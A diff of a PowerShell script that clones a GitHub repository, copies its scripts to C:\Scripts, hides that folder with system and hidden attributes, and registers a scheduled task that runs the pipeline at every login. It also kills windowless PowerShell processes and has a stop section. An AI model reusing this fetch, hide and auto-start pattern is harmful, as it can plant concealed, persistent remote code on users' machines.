@@ -1,3 +1,20 @@
+   $repoUrl = "https://github.com/krish307/haha.git"
+   $dest = "C:\Scripts"
+
+
+   Remove-Item $dest -Recurse -Force -ErrorAction SilentlyContinue
+   New-Item -Path $dest -ItemType Directory -Force | Out-Null
+
+   git clone $repoUrl "$env:TEMP\haha"
+   Copy-Item "$env:TEMP\haha\scripts\*" $dest -Recurse -Force
+   Remove-Item "$env:TEMP\haha" -Recurse -Force
+   Write-Host "Deployed at $dest"
+  
+   attrib +h +s $dest
+
+   Get-ChildItem $dest
+   Test-Path "C:\Scripts\pipeline.ps1"
+
 #start
 Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" } | Stop-Process -Force
 
@@ -34,15 +51,15 @@ Register-ScheduledTask -TaskName "MyPipelineJob" -Action $action -Trigger $trigg
 
 #check
 Get-Process powershell | Select-Object Id, StartTime; Get-Content "C:\Scripts\output.log" -Tail 10
-
+Write-Host "Done. Running now, and will auto-start on every future login."
 
 #stop
 Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" } | Stop-Process -Force
 Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*Pipeline*" } | Unregister-ScheduledTask -Confirm:$false
-
+Remove-Item "C:\Scripts\pipeline.lock" -Force -ErrorAction SilentlyContinue
 Write-Host "Stopped. Pipeline killed and auto-start removed."
 
 
 
 
-Write-Host "Done. Running now, and will auto-start on every future login."
+
